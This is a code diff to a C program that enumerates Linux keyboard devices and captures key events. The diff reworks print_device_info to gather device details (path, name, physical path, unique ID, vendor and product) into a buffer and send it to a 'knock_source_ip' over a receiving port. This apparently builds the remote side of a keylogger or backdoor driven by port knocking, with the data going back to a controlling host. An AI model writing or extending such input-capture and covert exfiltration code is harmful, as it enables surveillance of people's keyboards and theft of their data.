@@ -8,6 +8,7 @@
 #include <string.h>
 #include <sys/ioctl.h>
 #include <errno.h>
+#include "networking.h"
 
 uint32_t last_scan_code = 0;
 int last_scan_code_valid = 0;
@@ -330,40 +331,6 @@ int verify_device(const int fd) {
 }
 
 /**
- * Print device information
- */
-// void print_device_info(int fd) {
-//     char name[256] = "Unknown";
-//     char phys[256];
-//     struct input_id id;
-//     int has_name = 0;
-//     int has_phys = 0;
-//     int has_id = 0;
-//
-//     if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) >= 0) {
-//         printf("Device name: %s\n", name);
-//         has_name = 1;
-//     }
-//
-//     // Guard against empty string from EVIOCGPHYS
-//     if (ioctl(fd, EVIOCGPHYS(sizeof(phys)), phys) >= 0 && phys[0] != '\0') {
-//         printf("Physical path: %s\n", phys);
-//         has_phys = 1;
-//     }
-//
-//     if (ioctl(fd, EVIOCGID, &id) >= 0) {
-//         printf("Device ID: bus=0x%04x vendor=0x%04x product=0x%04x version=0x%04x\n",
-//                id.bustype, id.vendor, id.product, id.version);
-//         has_id = 1;
-//     }
-//
-//     // Only mention missing info if we at least got the name
-//     if (has_name && !has_phys && !has_id) {
-//         printf("(No physical path or device ID available)\n");
-//     }
-// }
-
-/**
  * Capture and display key events from device
  */
 void capture_keys(const char *device_path) {
@@ -499,18 +466,13 @@ void capture_keys(const char *device_path) {
     printf("\nCapture stopped.\n");
 }
 
-
-
 /**
  * Discover all keyboard devices in /dev/input
  */
-void discover_keyboards(void) {
+void discover_keyboards(struct session_info * session_info) {
     struct dirent *entry;
     char path[PATH_MAX_LEN];
     int keyboard_count = 0;
-
-    printf("Linux Keyboard Device Discovery\n");
-    printf("================================\n\n");
 
     // Open /dev/input directory
     DIR *dir = opendir("/dev/input");
@@ -520,7 +482,6 @@ void discover_keyboards(void) {
         return;
     }
 
-    printf("Scanning /dev/input for keyboard devices...\n\n");
 
     // Iterate through all entries
     while ((entry = readdir(dir)) != NULL) {
@@ -543,7 +504,7 @@ void discover_keyboards(void) {
         if (is_keyboard(fd)) {
             keyboard_count++;
             printf("Keyboard #%d:\n", keyboard_count);
-            print_device_info(path, fd);
+            print_device_info(session_info, path, fd);
             printf("\n");
         }
 
@@ -553,9 +514,6 @@ void discover_keyboards(void) {
     closedir(dir);
 
     // Summary
-    printf("================================\n");
-    printf("Total keyboards found: %d\n", keyboard_count);
-
     if (keyboard_count == 0) {
         printf("\nNo keyboards detected. Possible reasons:\n");
         printf("  - Insufficient permissions (try running with sudo)\n");
@@ -614,50 +572,57 @@ int is_keyboard(const int fd) {
 /**
  * Get detailed device information
  */
-void print_device_info(const char *path, const int fd) {
+void print_device_info(struct session_info * session_info, const char *path, const int fd) {
     char name[256] = "Unknown";
     char phys[256] = "Unknown";
     char uniq[256] = "Unknown";
     struct input_id device_info;
     unsigned long evbit[NBITS(EV_MAX)];
 
-    // Get device name
     ioctl(fd, EVIOCGNAME(sizeof(name)), name);
 
-    // Get physical location
     if (ioctl(fd, EVIOCGPHYS(sizeof(phys)), phys) < 0) {
         strcpy(phys, "N/A");
     }
 
-    // Get unique identifier
     if (ioctl(fd, EVIOCGUNIQ(sizeof(uniq)), uniq) < 0) {
         strcpy(uniq, "N/A");
     }
 
-    // Get device ID (vendor, product, etc.)
+    const size_t buffer_size = 1024;
+    char * buffer = malloc(buffer_size);
+    if (buffer == NULL) {
+        return;
+    }
+    memset(buffer, 0, buffer_size);
+
+    size_t offset = 0;
+
     if (ioctl(fd, EVIOCGID, &device_info) >= 0) {
-        printf("  Device:   %s\n", path);
-        printf("  Name:     %s\n", name);
-        printf("  Physical: %s\n", phys);
-        printf("  Unique:   %s\n", uniq);
-        printf("  Vendor:   0x%04x\n", device_info.vendor);
-        printf("  Product:  0x%04x\n", device_info.product);
-        printf("  Version:  0x%04x\n", device_info.version);
-        printf("  Bus Type: %d\n", device_info.bustype);
+        offset += snprintf(buffer + offset, buffer_size - offset, "  Device:   %s\n", path);
+        offset += snprintf(buffer + offset, buffer_size - offset, "  Name:     %s\n", name);
+        offset += snprintf(buffer + offset, buffer_size - offset, "  Physical: %s\n", phys);
+        offset += snprintf(buffer + offset, buffer_size - offset, "  Unique:   %s\n", uniq);
+        offset += snprintf(buffer + offset, buffer_size - offset, "  Vendor:   0x%04x\n", device_info.vendor);
+        offset += snprintf(buffer + offset, buffer_size - offset, "  Product:  0x%04x\n", device_info.product);
+        offset += snprintf(buffer + offset, buffer_size - offset, "  Version:  0x%04x\n", device_info.version);
+        offset += snprintf(buffer + offset, buffer_size - offset, "  Bus Type: %d\n", device_info.bustype);
     } else {
-        printf("  Device: %s\n", path);
-        printf("  Name:   %s\n", name);
+        offset += snprintf(buffer + offset, buffer_size - offset, "  Device: %s\n", path);
+        offset += snprintf(buffer + offset, buffer_size - offset, "  Name:   %s\n", name);
     }
 
-    // Show supported event types
     memset(evbit, 0, sizeof(evbit));
     if (ioctl(fd, EVIOCGBIT(0, EV_MAX), evbit) >= 0) {
-        printf("  Events:   ");
-        if (test_bit(EV_KEY, evbit)) printf("KEY ");
-        if (test_bit(EV_REL, evbit)) printf("REL ");
-        if (test_bit(EV_ABS, evbit)) printf("ABS ");
-        if (test_bit(EV_LED, evbit)) printf("LED ");
-        if (test_bit(EV_SND, evbit)) printf("SND ");
-        printf("\n");
+        offset += snprintf(buffer + offset, buffer_size - offset, "  Events:   ");
+        if (test_bit(EV_KEY, evbit)) offset += snprintf(buffer + offset, buffer_size - offset, "KEY ");
+        if (test_bit(EV_REL, evbit)) offset += snprintf(buffer + offset, buffer_size - offset, "REL ");
+        if (test_bit(EV_ABS, evbit)) offset += snprintf(buffer + offset, buffer_size - offset, "ABS ");
+        if (test_bit(EV_LED, evbit)) offset += snprintf(buffer + offset, buffer_size - offset, "LED ");
+        if (test_bit(EV_SND, evbit)) offset += snprintf(buffer + offset, buffer_size - offset, "SND ");
+        offset += snprintf(buffer + offset, buffer_size - offset, "\n");
     }
+
+    send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, buffer);
+    send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, RESPONSE);
 }
